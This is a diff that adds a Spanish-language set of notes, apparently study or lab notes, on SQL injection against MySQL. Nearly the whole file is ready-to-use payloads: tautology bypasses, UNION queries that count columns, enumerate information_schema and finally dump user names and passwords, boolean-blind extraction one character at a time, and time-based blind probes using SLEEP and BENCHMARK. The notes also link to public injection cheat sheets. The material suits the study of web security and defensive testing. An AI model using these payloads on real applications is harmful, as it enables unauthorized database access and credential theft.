@@ -1,0 +1,89 @@
+Ejemplos válidos para MySQL, cada BBDD tiene sus propios trucos.
+
+Directa:
+') or 1=1 --    (CON UN ESPACIO AL FINAL)
+' or '1'='1
+' or true or '
+
+Ajustar output:
+SI QUEREMOS AJUSTAR LA CANTIDAD DE DATOS DEVUELTOS (porque solo acepta meter X campos) PODEMOS USAR LIMIT Y OFFSET PARA IR VIENDO POCO A POCO
+Primero, debemos saber cuántas columnas hace la consulta, porque no siempre equivale al output (como en este caso):
+Vamos añadiendo/quitando "1"s en el SELECT, hasta que la cantidad de columnas equivalga a la de la consulta original
+') UNION SELECT 1,1,1 --
+Para saber qué columnas nos devuelve (como es un UNION, el nombre de la columna se mantiene como el original, por lo que no tenemos que preocuparnos de ajustar el output con alias).
+') UNION SELECT 1,2,3,4 -- 
+Buscamos para saber qué base de datos estamos utilizando actualmente:
+') UNION SELECT database(),database(),database(),database() -- 
+Buscamos las bases de datos y sus tablas
+') UNION SELECT table_schema,table_schema,table_name,table_name FROM information_schema.tables -- 
+Buscamos el nombre de las columnas de cada tabla
+') UNION SELECT 1,column_name,1,table_name FROM information_schema.columns -- '
+Y sacamos lo que queremos al final:
+') UNION SELECT 1,name,1,password FROM users -- 
+
+
+TIME-BASED:
+cuidado con el tiempo, puede que las configuraciones del servidor hagan timeout automaticamente a partir de X segundos
+') UNION SELECT * FROM users WHERE id=1 AND SLEEP(5) -- 
+') UNION SELECT * FROM users WHERE id=1-BENCHMARK(1000000, rand()) -- 
+
+
+
+BLIND:
+Probamos para ver si nos da o no error, o si algo cambia en la web, como aquí ya sabemos cómo funciona vamos directos:
+
+Aquí no debería dar error nunca, ya que siempre se va a cumplir que TRUE de TRUE
+1' OR TRUE)#
+Aquí se tienen que cumplir AMBAS condiciones para que no de error.
+1' AND TRUE)#
+
+Podemos sacar el nombre de la base de datos actual utilizando wildcards (lo haremos con las time-based blind), pero podemos buscar directamente los nombres de las tablas:
+
+Comprobamos que el primer caracter del nombre de la primera tabla es "mayor" que "a" (las mayúsculas al ir antes son menores):
+
+1' and Ascii(substring((Select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97)#
+
+Si vamos probando podemos descubrir la primera letra (u) :
+1' and Ascii(substring((Select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=117)#
+La segunda letra (s):
+1' and Ascii(substring((Select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=115)#
+Así podemos sacar caracter a caracter cualquier valor
+
+La continuación lógica sería ir a por los nombres de columnas de information_schema.columns (como las vimos en las directas) o probarlas a mano con wildcards hasta que salgan.
+Después ir a por los valores dentro de cada columna.
+
+http://securityidiots.com/Web-Pentest/SQL-Injection/Blind-SQL-Injection.html
+
+TIME-BASED BLIND:
+Ataques basados en herramientas que midan el tiempo de respuesta, para detectar cuánto tiempo ha estado ejecutando, para ver si hay errores pronto, tarde o no hay.
+Por ejemplo, en php hay funciones de comparación de strings que van letra por letra, el tiempo para comprobar 1 letra es diferente al que tarda en comprobar la primera, acertar, pasar a la segunda y fallar. Si se prueba muchas veces y haciendo medias, se pueden observar esas pequeñas diferencias y sacar cadenas caracter a caracter por ejemplo.
+En MySQL podemos utilizar Sleep o Benchmark 
+') UNION SELECT * FROM users WHERE id=1 AND SLEEP(5) -- 
+') UNION SELECT * FROM users WHERE id=1-BENCHMARK(1000000, rand()) -- 
+
+
+Añadir retardos aleatorios, no evita el ataque, sólo hace que requiera más tiempo:
+https://blog.ircmaxell.com/2014/11/its-all-about-time.html
+
+Después de la explicación, ejemplos prácticos:
+Primero comprobar que hay sleep
+1' and sleep(5)) -- 
+
+Podemos abusar las wildcards y las tablas de pruebas (dual)
+Si queremos, vamos a buscar el nombre de la base de datos actual, si se cumple el sleep implica que es cierta la afirmación:
+1' and (select sleep(5) from dual where database() like '_____'))#      (son 5 "_")
+1' and (select sleep(5) from dual where database() like '______'))#
+Ahora podemos ir buscando el nombre a mano probando letras:
+1' and (select sleep(5) from dual where database() like 'a_____'))#
+1' and (select sleep(5) from dual where database() like 't_____'))#
+
+Para sacar las letras que hay podemos usar %letra% para saber si está DENTRO de la palabra esa letra, una vez tengamos todas ya probamos en cada posición cada una.
+Aquí si acertamos la base de datos cumplirá el sleep
+1' and (select sleep(5) from dual where database() like 'things'))#
+Así podríamos empezar a sacar datos a placer concatenando queries.
+
+
+http://securityidiots.com/Web-Pentest/SQL-Injection/time-based-blind-injection.html
+https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#BlindSQLInjections
+
+http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
